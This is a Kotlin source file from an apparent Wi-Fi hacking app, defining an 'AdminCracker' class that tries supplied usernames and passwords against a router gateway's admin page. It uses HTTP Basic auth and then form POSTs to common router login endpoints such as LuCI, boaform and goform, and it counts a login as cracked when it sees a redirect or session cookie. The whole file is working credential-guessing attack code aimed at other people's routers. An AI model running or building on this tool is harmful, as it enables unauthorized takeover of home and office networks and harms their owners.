package com.aibuilt.wifihack.data

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.Credentials
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

data class AdminAttempt(
    val cred: Credential,
    val method: String,   // BASIC / FORM
    val code: Int,
    val success: Boolean,
    val note: String
)

class AdminCracker(private val client: OkHttpClient) {

    private val loginEndpoints = listOf(
        "cgi-bin/luci", "login.cgi", "boaform/admin/formLogin",
        "goform/login", "login", "api/login", "cgi-bin/login.cgi"
    )

    /** Try a single credential against gateway. Returns an attempt result. */
    suspend fun tryCredential(gateway: String, cred: Credential): AdminAttempt =
        withContext(Dispatchers.IO) {
            val base = "http://$gateway/"
            val http = client.newBuilder()
                .callTimeout(6, TimeUnit.SECONDS)
                .build()

            // 1) HTTP Basic auth
            runCatching {
                val req = Request.Builder()
                    .url(base)
                    .header("Authorization", Credentials.basic(cred.user, cred.pass))
                    .get()
                    .build()
                http.newCall(req).execute().use { r ->
                    val body = runCatching { r.peekBody(4096).string() }.getOrDefault("")
                    val looksLogin = body.contains("password", true) &&
                        body.contains("login", true)
                    if (r.code in 200..299 && !looksLogin) {
                        return@withContext AdminAttempt(
                            cred, "BASIC", r.code, true, "Authorized (HTTP ${r.code})"
                        )
                    }
                }
            }

            // 2) Form POST to common endpoints
            for (ep in loginEndpoints) {
                val attempt = runCatching {
                    val form = FormBody.Builder()
                        .add("username", cred.user)
                        .add("password", cred.pass)
                        .add("user", cred.user)
                        .add("pass", cred.pass)
                        .add("luci_username", cred.user)
                        .add("luci_password", cred.pass)
                        .build()
                    val req = Request.Builder().url(base + ep).post(form).build()
                    http.newCall(req).execute().use { r ->
                        val body = runCatching { r.peekBody(4096).string() }.getOrDefault("")
                        val failed = body.contains("invalid", true) ||
                            body.contains("incorrect", true) ||
                            body.contains("failed", true)
                        val token = body.contains("token", true) ||
                            r.headers("Set-Cookie").any { it.contains("sess", true) }
                        when {
                            r.code == 302 && !failed ->
                                AdminAttempt(cred, "FORM:$ep", r.code, true, "Redirect after login")
                            r.code in 200..299 && token && !failed ->
                                AdminAttempt(cred, "FORM:$ep", r.code, true, "Session granted")
                            else -> null
                        }
                    }
                }.getOrNull()
                if (attempt != null) return@withContext attempt
            }

            AdminAttempt(cred, "NONE", 0, false, "rejected")
        }
}
